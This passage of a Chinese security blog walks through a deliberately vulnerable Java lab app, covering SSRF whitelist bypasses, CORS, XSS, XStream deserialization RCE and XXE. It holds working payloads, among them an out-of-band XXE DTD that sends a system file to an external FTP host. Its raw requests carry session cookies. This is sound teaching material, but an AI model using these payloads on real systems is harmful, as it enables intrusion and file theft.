class="line">www.joychou.com&#x2F;_4528x2020.php</span><br></pre></td></tr></table></figure><p>用正则判断host是否是域名</p><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.10.xip.io</span><br></pre></td></tr></table></figure><p>案例：<br>腾讯某域名诊断功能存在SSRF（目前该漏洞已经修复）。<br>该功能验证逻辑，首先判断host是否是域名。</p><p>所以我们可以利用<code>xip.io</code>进行Bypass。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;regex&quot;)</span><br><span class="line">public String regex(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line">    Pattern p &#x3D; Pattern.compile(&quot;joychouorg&quot;);</span><br><span class="line">    Matcher m &#x3D; p.matcher(host);</span><br><span class="line"></span><br><span class="line">    if (m.find()) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;Bad url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151840814.png" alt="image-20211027151840814"></p><h4 id="5-正则匹配URL是否以-joychou-com"><a href="#5-正则匹配URL是否以-joychou-com" class="headerlink" title="5.正则匹配URL是否以.joychou.com"></a>5.正则匹配URL是否以.joychou.com</h4><p>正则为<code>.*\\.joychou.com$</code>的情况，之前的这两种<code>xxx.xxxjoychou.com</code>和<code>xxx.joychou.com.xxx</code>都不能绕过了。</p><p>Bypass Poc：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.baidu.com&#x2F;?xxx.joychou.com</span><br></pre></td></tr></table></figure><h3 id="4-安全代码和测试环境"><a href="#4-安全代码和测试环境" class="headerlink" title="4.安全代码和测试环境"></a>4.安全代码和测试环境</h3><p>安全代码逻辑很简单：</p><ul><li>取一级域名</li><li>判断一级域名是否在白名单里。</li></ul><p>方法调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] urlwhitelist = &#123;<span class="string">&quot;joychou.com&quot;</span>, <span class="string">&quot;joychou.me&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (!UrlSecCheck(url, urlwhitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>方法代码：</p><p>需要先添加guava库（目的是获取一级域名）</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>21.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u = new URL(url);</span><br><span class="line">        // 只允许http和https的协议</span><br><span class="line">        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">            return  false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取域名，并转为小写</span><br><span class="line">        String host = u.getHost().toLowerCase();</span><br><span class="line">        // 获取一级域名</span><br><span class="line">        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();</span><br><span class="line"></span><br><span class="line">        for (String whiteurl: urlwhitelist)&#123;</span><br><span class="line">            if (rootDomain.equals(whiteurl)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;sec&quot;)</span><br><span class="line">public String sec(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String whiteDomainlists[] &#x3D; &#123;&quot;joychou.org&quot;, &quot;joychou.com&quot;, &quot;test.joychou.me&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String whiteHost: whiteDomainlists)&#123;</span><br><span class="line">        if (whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.endsWith(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125; else if (!whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.equals(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;array_indexOf&quot;)</span><br><span class="line">public String sec_array_indexOf(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Define muti-level host whitelist.</span><br><span class="line">    ArrayList&lt;String&gt; whiteDomainlists &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">    whiteDomainlists.add(&quot;bbb.joychou.org&quot;);</span><br><span class="line">    whiteDomainlists.add(&quot;ccc.bbb.joychou.org&quot;);</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    if (whiteDomainlists.indexOf(host) !&#x3D; -1) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-CORS绕过"><a href="#5-CORS绕过" class="headerlink" title="5.CORS绕过"></a>5.CORS绕过</h3><p>先来看看<code>Access-Control-Allow-Origin</code>的使用。一般有两种方式设置该值：</p><ul><li>后端代码设置</li><li>Nginx等Web服务器设置</li></ul><p>域名设置<code>test.joychou.org</code>如下，表示该域名只接受来自<code>http://blacktech.com</code>的请求。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_header  Access-Control-Allow-Origin &#39;http:&#x2F;&#x2F;blacktech.com&#39;;</span><br></pre></td></tr></table></figure><p>本地写一份请求<code>test.joychou.org</code>的代码，保存为1.html</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">        type: &#39;GET&#39;,</span><br><span class="line">        url: &#39;http:&#x2F;&#x2F;test.joychou.org&#39;,</span><br><span class="line">        success: function (data) &#123;</span><br><span class="line">            alert(data);</span><br><span class="line">            console.log(&#39;Yeah! Load Success.&#39;);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (error) &#123;</span><br><span class="line">            alert(&#39;Oh,no! Load Failed.&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>请求<code>http://localhost/1.html</code>报错如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Failed to load http:&#x2F;&#x2F;test.joychou.org&#x2F;: The &#39;Access-Control-Allow-Origin&#39; header has a value &#39;http:&#x2F;&#x2F;blacktech.com&#39; that is not equal to the supplied origin. Origin &#39;http:&#x2F;&#x2F;localhost&#39; is therefore not allowed access.</span><br></pre></td></tr></table></figure><p>改下<code>/etc/hosts</code>，把 localhost 改成 blacktech.com，请求<code>http://blacktech.com/1.html</code>就不会报错了，而且能获取到<br><a href="http://test.joychou.org/">http://test.joychou.org</a> 的返回内容<code>It works.</code></p><p>我们来看看<code>origin</code>，这个值和Referer一样，前端不能设置，如果<code>http://baidu.com</code>对<code>http://test.joychou.org</code>发起一个跨域请求，那么<code>origin</code>的值就为<code>http://baidu.com</code>。</p><p>那么问题来了，如果<code>Access-Control-Allow-Origin</code>设置的域名能被绕过，那么用请求header里的<code>origin</code>绕即可。绕过后，就能获取接口的数据，和JSONP一样。</p><h2 id="18-XSS"><a href="#18-XSS" class="headerlink" title="18.XSS"></a>18.XSS</h2><p>XSS作者提供了两种利用场景</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;reflect?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153333287.png" alt="image-20211027153333287"></p><p>这里还展示一种将XSS语句带入cookie，然后在其他处调出造成XSS的可能性</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">    Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    return &quot;Set param into cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;show&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;store?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;show</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153527388.png" alt="image-20211027153527388"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;safe&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String safe(String xss) &#123;</span><br><span class="line">    return encode(xss);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static String encode(String origin) &#123;</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&quot;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">    return origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将特殊字符进行转译</p><h2 id="19-XStreamRCE"><a href="#19-XStreamRCE" class="headerlink" title="19.XStreamRCE"></a>19.XStreamRCE</h2><blockquote><p>XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</p><p>Xstream具有以下优点</p><ul><li>使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。</li><li>无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。</li><li>性能 - XStream快速和低内存占用，适合于大对象图或系统。</li><li>干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。</li><li>不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。</li><li>完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。</li><li>可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。</li><li>安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。</li><li>错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。</li><li>另一种输出格式 - XStream支持其它的输出格式，如JSON。</li></ul></blockquote><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @PostMapping(&quot;&#x2F;xstream&quot;)</span><br><span class="line">    public String parseXml(HttpServletRequest request) throws Exception &#123;</span><br><span class="line">        String xml &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">        return &quot;xstream&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user &#x3D; new User();</span><br><span class="line">        user.setId(0);</span><br><span class="line">        user.setUsername(&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        String xml &#x3D; xstream.toXML(user); &#x2F;&#x2F; Serialize</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        user &#x3D; (User) xstream.fromXML(xml); &#x2F;&#x2F; Deserialize</span><br><span class="line">        System.out.println(user.getId() + &quot;: &quot; + user.getUsername());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造请求包如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xstream HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;7BBEAB4E7FC8E7B10575631B0CA5413C; XSRF-TOKEN&#x3D;820fd620-2c78-424b-a852-93ca40553975; remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 445</span><br><span class="line"></span><br><span class="line">&lt;sorted-set&gt;  </span><br><span class="line">  &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt; &lt;!-- --&gt;</span><br><span class="line">    &lt;interface&gt;java.lang.Comparable&lt;&#x2F;interface&gt;</span><br><span class="line">    &lt;handler class&#x3D;&quot;java.beans.EventHandler&quot;&gt;</span><br><span class="line">      &lt;target class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;command&gt;</span><br><span class="line">          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">          &lt;string&gt;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">        &lt;&#x2F;command&gt;</span><br><span class="line">      &lt;&#x2F;target&gt;</span><br><span class="line">      &lt;action&gt;start&lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;handler&gt;</span><br><span class="line">  &lt;&#x2F;dynamic-proxy&gt;</span><br><span class="line">&lt;&#x2F;sorted-set&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027154504421.png" alt="image-20211027154504421"></p><ol><li><a href="https://www.cnblogs.com/303donatello/p/13998245.html">CVE-2020-26217 | XStream远程代码执行漏洞</a></li><li><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">通过XStream对象反序列化的RCE</a></li><li><a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li></ol><h2 id="20-XXE"><a href="#20-XXE" class="headerlink" title="20.XXE"></a>20.XXE</h2><p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;DocumentBuilder&#x2F;vuln01&quot;, method &#x3D; RequestMethod.POST)</span><br><span class="line">public String DocumentBuilderVuln01(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line">        StringReader sr &#x3D; new StringReader(body);</span><br><span class="line">        InputSource is &#x3D; new InputSource(sr);</span><br><span class="line">        Document document &#x3D; db.parse(is);  &#x2F;&#x2F; parse xml</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 遍历xml节点name和value</span><br><span class="line">        StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        NodeList rootNodeList &#x3D; document.getChildNodes();</span><br><span class="line">        for (int i &#x3D; 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode &#x3D; rootNodeList.item(i);</span><br><span class="line">            NodeList child &#x3D; rootNode.getChildNodes();</span><br><span class="line">            for (int j &#x3D; 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                Node node &#x3D; child.item(j);</span><br><span class="line">                buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sr.close();</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有回显的利用方式</p><p>输入对应的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;book id&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;name&gt;Good Job&lt;&#x2F;name&gt;</span><br><span class="line">&lt;author&gt;ol4three&lt;&#x2F;author&gt;</span><br><span class="line">&lt;year&gt;2021&lt;&#x2F;year&gt;</span><br><span class="line">&lt;price&gt;100.00&lt;&#x2F;price&gt;</span><br><span class="line">&lt;&#x2F;book&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163512520.png" alt="image-20211027163512520"></p><p>利用file协议读取文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 131</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE joychou [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;111.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163556622.png" alt="image-20211027163556622"></p><p>在 XML 元素中，”&lt;” 和 “&amp;” 是非法的。”&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。”&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164028767.png" alt="image-20211027164028767"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ cat 111.txt</span><br><span class="line">ol4three</span><br><span class="line">1111</span><br><span class="line">~!@#%^%&#39;&quot;&gt;</span><br><span class="line">2222</span><br><span class="line">&lt;%&amp;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164104470.png" alt="image-20211027164104470"></p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><blockquote><p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p><p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p></blockquote><p>简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。</p><h3 id="1-有回显"><a href="#1-有回显" class="headerlink" title="1.有回显"></a>1.有回显</h3><p>本地主机：CDATA Payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;test.ol4three.com:800&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p>本地主机：evil.dtd</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>但我在测试用CDATA，并没有读取<code>&lt;&amp;</code>成功</p><h3 id="2-Bind-无回显"><a href="#2-Bind-无回显" class="headerlink" title="2.Bind 无回显"></a>2.Bind 无回显</h3><p>payloads：</p><ul><li>没有ENTITY关键字，可以用来Bypass WAF</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>有ENTITY关键字，可能会被WAF拦截</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;redhat-release&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;ftp:&#x2F;&#x2F;fakeuser:fakepass@test.joychou.org:2121&#x2F;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><p>或者将<code>%payload;</code>放在ftp的username或者password处。如果ftp不跟用户名或者密码<code>ftp://test.joychou.org:2121/%payload;</code>，利用FTP协议会接收到Java的版本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New client connected</span><br><span class="line">&lt; USER anonymous</span><br><span class="line">&lt; PASS 